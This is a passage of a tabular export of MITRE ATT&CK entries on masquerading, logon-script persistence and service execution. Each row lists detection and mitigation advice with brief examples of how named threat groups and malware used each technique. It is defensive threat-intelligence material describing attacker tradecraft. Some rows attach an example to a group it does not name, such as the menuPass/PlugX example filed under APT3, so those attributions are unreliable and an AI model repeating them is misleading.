SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mis-Type,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
591,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0085|S-Type]] may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[[CiteRef::Cylance Dust Storm]][[CiteRef::Microsoft DTC]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: S-Type,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
592,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0086|ZLib]] mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ZLib,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
593,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']",['[[Group/G0033|Poseidon Group]] tools attempt to spoof anti-virus processes as a means of self-defense.[[CiteRef::Kaspersky Poseidon Group]]'],['Poseidon Group'],['Poseidon Group'],['G0033'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
594,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['In one instance, [[Group/G0045|menuPass]] added [[Software/S0013|PlugX]] as a service with a display name of ""Corel Writing Tools Utility.""[[CiteRef::FireEye APT10 April 2017]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
595,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['In one instance, [[Group/G0045|menuPass]] added [[Software/S0013|PlugX]] as a service with a display name of ""Corel Writing Tools Utility.""[[CiteRef::FireEye APT10 April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
596,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']",['[[Software/S0144|ChChes]] copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
597,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","[u'[[Group/G0040|Patchwork]] installed its payload in the startup programs folder as ""Baidu Software Update."" The group also adds its second stage payload to the startup programs as \u201cNet Monitor.""[[CiteRef::Cymmetria Patchwork]]']",['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
598,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['In one instance, [[Group/G0045|menuPass]] added [[Software/S0013|PlugX]] as a service with a display name of ""Corel Writing Tools Utility.""[[CiteRef::FireEye APT10 April 2017]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
599,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","[""[[Software/S0070|HTTPBrowser]]'s installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.[[CiteRef::ZScaler Hacking Team]]""]",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
600,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['[[Software/S0072|OwaAuth]] uses the filename owaauth.dll, which is a legitimate file that normally resides in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\</code>; the malicious file by the same name is saved in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\</code>.[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: OwaAuth,['Defense Evasion'],['Technique/T1036'],['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
601,['Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.'],[],['564'],[],"['File monitoring', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Restrict write access to logon scripts to specific administrators. Prevent access to administrator accounts by mitigating [[Credential Access]] techniques and limiting account access and permissions of [[Technique/T1078|Valid Accounts]].\n\nIdentify and block potentially malicious software that may be executed through logon script modification by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",[],['Write access to system or domain logon scripts'],"Software: JHUHUGIT, Seduploader, ...","['Lateral Movement', 'Persistence']",['Technique/T1037'],['Logon Scripts'],https://attack.mitre.org/wiki/Technique/T1037
602,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
603,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
604,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
605,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['[[Software/S0056|Net Crawler]] uses [[Software/S0029|PsExec]] to perform remote service manipulation to execute a copy of itself as part of lateral movement.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net Crawler, NetC",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
606,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
607,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['[[Software/S0123|xCmd]] can be used to execute binaries on remote systems by creating and starting a service.[[CiteRef::xCmd]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: xCmd,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
608,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
